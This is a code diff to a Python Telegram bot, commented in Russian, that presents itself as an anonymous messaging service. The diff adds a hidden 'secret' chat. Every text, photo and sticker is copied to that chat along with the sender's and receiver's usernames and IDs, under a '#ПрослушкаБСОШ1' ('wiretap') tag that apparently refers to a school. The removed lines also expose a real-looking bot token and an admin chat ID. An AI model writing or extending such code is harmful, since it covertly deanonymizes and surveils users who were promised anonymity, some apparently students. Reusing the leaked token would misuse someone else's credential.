@@ -5,13 +5,14 @@ import string
 
 
 # Замените 'YOUR_BOT_TOKEN' на токен вашего бота
-#bot_token = '7621465144:AAH22TzgDIAMM6SoEcv1NxpbTjLWJ_Z5fkA'
+
 bot_token = input('Введите ваш API TOKEN бота:')
 bot = telebot.TeleBot(bot_token)
 
 # Замените 'YOUR_ADMIN_CHAT_ID' на ID чата администратора
-#ADMIN_CHAT_ID = -4521299845 # Замените на ваш ID
+
 ADMIN_CHAT_ID = input('Введите айди админ:')
+SECRET_CHAT_ID = input('Введите айди секрет:')
 # Словарь для хранения состояний пользователей
 user_states = {}
 
@@ -86,7 +87,7 @@ def handle_start(message):
 # Обработка текстовых сообщений для анонимной отправки
 @bot.message_handler(content_types=['text'])
 def handle_anonymous_message(message):
-  print(user_states)
+
   if message.chat.id == ADMIN_CHAT_ID:
     return # Игнорируем сообщения из админского чата
   
@@ -122,13 +123,15 @@ def handle_anonymous_message(message):
         print(f"Database error (text): {e}")
 
 
-    if message.from_user.id == user_states.get(receiver_id):
+    if message.from_user.id == user_states.get(receiver_id) and message.from_user.id not in user_states:
       bot.send_message(receiver_id, f"Вам ответили")
       bot.send_message(receiver_id, f"Ответ на ваше сообщение {msg_text}")
       if receiver_id != ADMIN_CHAT_ID:
         bot.send_message(ADMIN_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):\n{msg_text}")
+        bot.send_message(SECRET_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):\n{msg_text}")
       else:
         bot.send_message(ADMIN_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:\n{msg_text}")
+        bot.send_message(SECRET_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:\n{msg_text}")
      
       del user_states[sender_id]
       del user_states[receiver_id]
@@ -142,13 +145,15 @@ def handle_anonymous_message(message):
     # Отправляем в админский чат с информацией
     if receiver_id != ADMIN_CHAT_ID:
       bot.send_message(ADMIN_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):\n{msg_text}")
+      bot.send_message(SECRET_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):\n{msg_text}")
     else:
       bot.send_message(ADMIN_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:\n{msg_text}")
+      bot.send_message(SECRET_CHAT_ID, f"Сообщение от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:\n{msg_text}")
 
 # Обработка фото
 @bot.message_handler(content_types=['photo'])
 def handle_photo_message(message):
-  print(user_states)
+
   if message.chat.id == ADMIN_CHAT_ID:
     return # Игнорируем сообщения из админского чата
 
@@ -179,13 +184,15 @@ def handle_photo_message(message):
       # Добавляем запись в таблицу 'message'
 
 
-    if message.from_user.id == user_states.get(receiver_id):
+    if message.from_user.id == user_states.get(receiver_id) and message.from_user.id not in user_states:
       bot.send_message(receiver_id, f"Вам ответили")
       bot.send_photo(receiver_id,message.photo[-1].file_id, caption=f'Ответ на ваше сообщение: {caption}')
       if receiver_id != ADMIN_CHAT_ID:
         bot.send_photo(ADMIN_CHAT_ID, message.photo[-1].file_id,caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id})")
+        bot.send_photo(SECRET_CHAT_ID, message.photo[-1].file_id,caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id})")
       else:
         bot.send_photo(ADMIN_CHAT_ID,message.photo[-1].file_id, caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
+        bot.send_photo(SECRET_CHAT_ID,message.photo[-1].file_id, caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
 
       del user_states[receiver_id]
       return
@@ -198,8 +205,10 @@ def handle_photo_message(message):
     # Отправляем в админский чат с информацией
     if receiver_id != ADMIN_CHAT_ID:
       bot.send_photo(ADMIN_CHAT_ID, message.photo[-1].file_id,caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id})")
+      bot.send_photo(SECRET_CHAT_ID, message.photo[-1].file_id,caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id})")
     else:
       bot.send_photo(ADMIN_CHAT_ID,message.photo[-1].file_id, caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
+      bot.send_photo(SECRET_CHAT_ID,message.photo[-1].file_id, caption=f"Фото от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
 
 
 
@@ -226,15 +235,19 @@ def handle_sticker_message(message):
 
 
 
-  if message.from_user.id == user_states.get(receiver_id):
+  if message.from_user.id == user_states.get(receiver_id) and message.from_user.id not in user_states:
       bot.send_message(receiver_id, f"Вам ответили. Ответ на ваше:")
       bot.send_sticker(receiver_id, sticker_file_id)
       if receiver_id != ADMIN_CHAT_ID:
         bot.send_message(ADMIN_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):")
         bot.send_sticker(ADMIN_CHAT_ID, sticker_file_id)
+        bot.send_message(SECRET_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):")
+        bot.send_sticker(SECRET_CHAT_ID, sticker_file_id)
       else:
         bot.send_message(ADMIN_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
         bot.send_sticker(ADMIN_CHAT_ID, sticker_file_id)
+        bot.send_message(SECRET_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
+        bot.send_sticker(SECRET_CHAT_ID, sticker_file_id)
       del user_states[receiver_id]
       del user_states[sender_id]
       return
@@ -244,9 +257,13 @@ def handle_sticker_message(message):
   if receiver_id != ADMIN_CHAT_ID:
     bot.send_message(ADMIN_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):")
     bot.send_sticker(ADMIN_CHAT_ID, sticker_file_id)
+    bot.send_message(SECRET_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к @{receiver_username} (ID: {receiver_id}):")
+    bot.send_sticker(SECRET_CHAT_ID, sticker_file_id)
   else:
     bot.send_message(ADMIN_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
     bot.send_sticker(ADMIN_CHAT_ID, sticker_file_id)
+    bot.send_message(SECRET_CHAT_ID, f"Стикер от @{message.from_user.username} (ID: {sender_id}) к #ПрослушкаБСОШ1:")
+    bot.send_sticker(SECRET_CHAT_ID, sticker_file_id)
   
   
 # Обработка кнопок
